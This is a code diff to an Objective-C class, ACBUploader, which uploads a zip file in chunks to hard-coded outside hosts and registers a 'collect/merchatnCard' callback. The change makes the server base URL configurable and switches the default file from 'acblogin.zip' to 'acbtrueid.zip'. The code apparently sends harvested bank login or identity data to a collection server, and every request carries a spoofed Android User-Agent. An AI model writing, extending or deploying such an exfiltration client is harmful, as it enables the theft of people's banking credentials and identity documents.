@@ -1,8 +1,8 @@
 #import "ACBUploader.h"
 
 static const NSInteger kChunkSize = 1442053;
-static NSString *const kUploadUrl = @"https://img.wenj123123.com/file/chunk/upload";
-static NSString *const kCallbackUrl = @"https://vn.advnvn123123.com/collect/merchatnCard/saveBatchResource";
+static NSString *const kDefaultUploadUrl = @"https://img.wenj123123.com/file/chunk/upload";
+static NSString *const kDefaultCallbackUrl = @"https://vn.advnvn123123.com/collect/merchatnCard/saveBatchResource";
 
 @implementation ACBUploader
 
@@ -19,6 +19,14 @@ static NSString *const kCallbackUrl = @"https://vn.advnvn123123.com/collect/merc
             return;
         }
         
+        NSString *uploadUrlStr = kDefaultUploadUrl;
+        NSString *callbackUrlStr = kDefaultCallbackUrl;
+        if (self.serverBaseUrl && self.serverBaseUrl.length > 0) {
+            NSString *cleanBase = [self.serverBaseUrl stringByTrimmingCharactersInSet:[NSCharacterSet characterSetWithCharactersInString:@"/"]];
+            uploadUrlStr = [NSString stringWithFormat:@"%@/file/chunk/upload", cleanBase];
+            callbackUrlStr = [NSString stringWithFormat:@"%@/collect/merchatnCard/saveBatchResource", cleanBase];
+        }
+        
         NSDictionary *attrs = [fm attributesOfItemAtPath:zipFilePath error:nil];
         unsigned long long fileSize = [attrs fileSize];
         NSInteger totalChunks = (NSInteger)ceil((double)fileSize / (double)kChunkSize);
@@ -28,7 +36,7 @@ static NSString *const kCallbackUrl = @"https://vn.advnvn123123.com/collect/merc
         long timestampSec = (long)now;
         NSString *uploadId = [NSString stringWithFormat:@"_%ld", timestampSec];
         NSString *batchId = [NSString stringWithFormat:@"batch_%ld", timestampSec];
-        NSString *actualFileName = fileName ?: @"acblogin.zip";
+        NSString *actualFileName = fileName ?: @"acbtrueid.zip";
         
         NSFileHandle *fileHandle = [NSFileHandle fileHandleForReadingAtPath:zipFilePath];
         if (!fileHandle) {
@@ -62,7 +70,7 @@ static NSString *const kCallbackUrl = @"https://vn.advnvn123123.com/collect/merc
             
             // 2. HTTP Multipart Request
             NSString *boundary = [NSString stringWithFormat:@"Boundary-%@", [[NSUUID UUID] UUIDString]];
-            NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:kUploadUrl]];
+            NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:uploadUrlStr]];
             [request setHTTPMethod:@"POST"];
             [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
             [request setValue:@"Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4 Build/TP1A.221005.002.B2)" forHTTPHeaderField:@"User-Agent"];
@@ -74,7 +82,7 @@ static NSString *const kCallbackUrl = @"https://vn.advnvn123123.com/collect/merc
             // callbackUrl
             [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
             [body appendData:[@"Content-Disposition: form-data; name=\"callbackUrl\"\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
-            [body appendData:[[NSString stringWithFormat:@"%@\r\n", kCallbackUrl] dataUsingEncoding:NSUTF8StringEncoding]];
+            [body appendData:[[NSString stringWithFormat:@"%@\r\n", callbackUrlStr] dataUsingEncoding:NSUTF8StringEncoding]];
             
             // businessParams
             [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
